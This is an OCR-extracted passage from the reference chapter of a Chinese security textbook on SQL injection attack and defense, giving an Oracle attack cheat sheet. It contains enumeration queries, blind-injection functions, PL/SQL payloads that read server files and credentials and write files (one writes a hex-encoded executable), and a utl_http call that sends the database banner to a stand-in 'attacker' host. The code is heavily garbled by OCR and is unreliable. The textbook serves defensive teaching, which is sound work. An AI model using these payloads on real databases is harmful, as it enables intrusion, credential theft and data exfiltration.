5）写入文件
在MySQL数据库中，可以在任意SELECT语句之后添加INTO dumpfile 指令，直接将查
询结果输出到外部文件中（假如具有许可权限)。恶意的攻击者可以滥用该特性以创建带有Web
可访问向导的后门脚本，或者创建将被常规执行的特洛伊（Trojan）脚本。下面的查询将从mytable
表中返回所有数据，并将输出写入到/tmp/hacker中：
11.3.5Oracle备忘单
在以数据库性能或高可用性为核心需求的大型应用中，通常会使用Oracle数据库。
1.枚举数据库配置信息和模式
表11-15列出了用于提取关键配置信息的SQL语句。表11-16和11-17列出了用于枚举
Oracle模式信息的SQL语句。
408
---
## Page 423
第11章参考资料
表11-15提取Oracle服务器的配置信息
数
查
询
版本
SELECT banner FROM v$version;
当前用户
SELECT user FROM dual/
列出用户
SELECT username FROM al1_users ORDER BY username;
SELECr * FROM user role_privsj
SELECr · FROM user_sys_privs;
SELECT * FROM user_tab_privs1
当前用户权限
SELECT sys_context(*USERENV','ISDBA') FROM dual;
SELECT grantee FROM dba_sys_privs WHERE
privilege - 'SELECT ANY DICTIONARY′;
应用服务器主机名
SELECT sys_context (*USERENV*, 'HOST') FROM dual;
SELECT sys_context (*USERENV',
'SERVER_HOST') FROM dua1;
数据库服务器主机名
SELECT UTL_INADDR.get_host_name FROM dual
SELECT ut1_http.request (*http://attacker:100o/*1I ( SELECT
建立外部连接
bannez FROM v$version WHERE rownum=1)) FROM dual;
上述语句使用端口1000与主机建立了一条HTTP连接，攻击者(HTTP请求）在请
求路径中包含了Oracle的版本标志
引发包含版本标志的错误
引发错误
AND (ut1_inaddr,get_host_name ( (select
banner from v$version where
ronum=1)))=1
表11-16提取Oracle数据库的模式信息
据
查
询
数据库名
SELECT global_name FRON global_name;
列出模式用户
SELECT username FRoM a11_users/
列出表名及其模式
SELECT ower, table_name FROM all_users;
列出列
SELECT ower, table_name, column_name
FROM a11_tab_columns WHERE table_name=*tb1Users′;
表11-17数据库中的加密信息
数
据
查
询
SELECT table_name, column_name,
encryption_alg, salt FROM dba_
经过加密的表
encrypted_columns;
从Oracle 10g开始，可以对表使用透明加密。考虑到性能原因，通常只对最重要的
列进行加密
SELECT owner, name, type, referenced_same
列出使用加密库的
FROM a11_dependencies;
对象
显示使用了数据库加密的对象(例如，DBMS_CRYPTO和 DBMS_OBFUSCATION
TOOLKIT中的密码)
409
---
## Page 424
SQL注入攻击与防御（第2版）
（续表）
数
据
查
询
SELECT owner, object_name, procedure_name
FROM al1_procedures where (lower (object,
列出包含crypr字符
name) LIKE *scrypts* or lower (procedure_
串的 PL/SQL 函数
name) 1ike *$crypt$′) AND
object_name not in (*DBMs_OBFUSCATION_
TOOLKIT*, 'DBMS_CRYPTO_TOOLKIT')
2.SQL盲注函数：Oracle
表11-18列出了执行SQL盲注攻击时一些非常有用的函数。
表11-18SQL盲注函数
数
据
查
字符串长度
LENGTH ()
从给定字符串中提
取子串
SELECT SUBsTR(string, offset, length) FROM dual;
SELECT chr (65) 11chr (66) 11 chz (67) FROMdual:
字符串（ABC)不带
SELECT concat (chr (65) , concat (chr (66) , chr (67))) FROM dual ;
单引号的表示方式
SELECT upper ((select substr (banner, 3, 1) 11sub
str (banner, 12, 1) 1|substr (banner, 4, 1) from
v$version where ronum=1)) FROM dual;
SELECT UTL_INADDR.get_host_address (*nowhere999,zom*)
触发时间延迟
FROM dua1;
-触发可度量的时间延迟
3.攻击数据库服务器：Oracle
Oracle中存在两种不同类型的注入：传统 SQL注入和PL/SQL注入。在PL/SQL注入中，
可以执行整个PL/SQL块：而在传统的SQL注入中，通常则只能修改单条SQL语句。
1）命令执行
可以使用下列脚本（由MacroIvaldi编写）实现系统命令的执行和本地文件的读/写访间：
●www. Oxdeadbeef.info/exploits/raptor_oraexec.sql1
●www. 0xdeadbeef.info/exploits/raptor_oraextproc.sql
2）读本地文件
下面是一些PL/SQL代码的例子，用于从Oracle服务器读取本地文件。
读本地文件：XMLType
DB_1\OWB\J2EE\CONFIG′;
select extractvalue (value (c), */connection-factory/@user′)I1*/*11
extractvalue (value (c), * /connection-factory/@password*) 11*e*IIsubstr
410
---
## Page 425
第11章参考资料
(extractvalue (value (c) , */connection-factory/@ur1′), instr (extractvalue
(value (c), '/connection-factory/@ur1*), *//*) +2) conn
FROM table (
XMLSequence (
extract (
xm1type (
bfilename (*GETPWDIR*, 'data-sources.xml′),
n1s_charset_id(*wE8IsO8859P1*)
*/data-sources/connection-pool/connection-factory'
读本地文件：OracleText
CREATE TABLE fi1es (id NUMBER PRIMARY KEY, path VARCHR (255) UNIQUE,
ot_format VARCHAR (6)) :
INSERT INTO files VALUES (1, *c:\boot.ini', NULL);
--将准备要读取的列插入到表中（比如通过SQL注入读取）
CREATE INDEX file_index ON files (path) INDEXTYPE IS ctxsys.context
PARAMETERS (*datastore ctxsys.file_datastore format column ot_format');
--从全文索引检索数据（boot.ini)
SELECT token_text from drSfile_index$i;
3）读本地文件（仅限于PL/SQL注入）
接下来的例子只有在执行PL/SQL注入攻击时才会起作用。大多数情况下，需要直接连接
到数据库来执行PL/SQL块：
读本地文件：dbms_lob
Create or replace directory ext AS *C:\′;
DECLARE
buf varchar2 (4096) ;
BEGIN
Lob_1oc:= BFILENAME('MEDIA_DIR', *aht,txt′);
DBMS_LOB ,OPEN (Lob_1oC, DBMS_LOB.LOB_READONLY) ;
DBMS_L0B.READ (Lob_1oc, 1000, 1, buf) ;
dbms_output -put_1ine (ut1_raw.cast_to_varchar2 (buf) )
DBMS_LOB,CL0SE (Lob_1oc) :
END;
* via external table
CREATE TABLE products_ext
(prod_id NUMBER, prod_name VARCHAR2 (50), prod_desc VARCHAR2 (4000) ,
prod_category VARCHAR2 (50) , prod_category_desc VARCHAR2 (4000) ,
list_price
NUMBER (6, 2), min_price NUMBER (6, 2) , last_updated DATE)
ORGANIZATION EXTERNAL
TYPE oracle_loader
DEFAULT DIRECTORY stage_dir
ACCESS PARAMETERS
411
---
## Page 426
SQL注入攻击与防御（第2版）
BADFILE ORAHOME: ′,rhosts'
LOGFILE ORAHOME: *1og_products_ext '
FIELDS TERXINATED BY ',*
(prod_id, prod_name, prod_desc, prod_category, prod_category_
desc, price, price_delta, last_updated char date_format date mask
"ddmon-yyyy*)
LOCATION ('data.txt')
PARALLEL 5
4）写本地文件（仅限于PL/SQL注入）
接下来的代码示例只有作为PL/SQL块才会成功执行。多数情况下，需要通过SQL*Plus等
客户端来直接连接到数据库。
写本地文本文件：ul_file
Create or replace directory ext As 'C:\′;
DECLARE
v_file UTL_FILE.FILE_TYPE;
BEGIN
v_fi1e:= UTL_FILE.FOPEN(*EXT′, *aht.txt′,*v′) ;
UTL_FILE.PUT_LINE (v_file, *first row′) ;
UTL_FILE.NEW_LINE (v_fIle) :
UTL_FILE.PUT_LINE (v_file, *second row*) ;
UTL_FILE.FCLOSE (v_fi1e) ;
END;
写本地二进制文件：utl_file
Create or replace directory ext As *C:\′/
Create or replace directory ext As *C:\';
DECLARE fi UTL_FILE.FILE_TYPE;
bu RA￥ (32767) ;
NIDEG
bu:=hextora¥ (*BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C40
2CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BE
C8B5E088B4E048B5 606B80040CD21730231C08BE55DC3904865 6C6C6F2C20576
fi :=UTL_FILE. fopen (*EXT′, *he11o. com′, *wb′,32767) ;
F726C64210D0A′) ;
UTL_FILE ,put_raw (fi,bu, TRUE) 
UTL_FILE, fclose (fi) :
END/
/
写本地文件：dbms_advisor(Oracle 10g及之后的版本)